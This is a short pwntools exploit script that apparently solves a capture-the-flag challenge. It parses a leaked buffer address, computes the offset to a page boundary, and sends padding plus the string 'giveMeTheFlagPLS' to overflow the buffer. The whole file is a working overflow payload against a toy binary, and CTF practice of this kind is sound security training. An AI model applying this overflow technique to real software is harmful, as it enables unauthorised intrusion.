#!/usr/bin/env python3
from pwn import *

elf = ELF("./chall")
p = elf.process()
# gdb.attach(p, '''
# 	b *main+144
# 	''')

p.recvuntil(b"buffer at: ")
gift = p.recvline().strip()
gift = int(gift, 16)
log.info("gift: " + hex(gift))
start = gift >> 16
start = (start << 16) + 0x10000
log.info("string 'giveMeTheFlagPLS' start address: " + hex(start))

offset = start - gift 
pl = b""
pl += b"A" * offset
pl += b"giveMeTheFlagPLS"
p.sendlineafter(b"secret string: ", pl)

p.interactive()

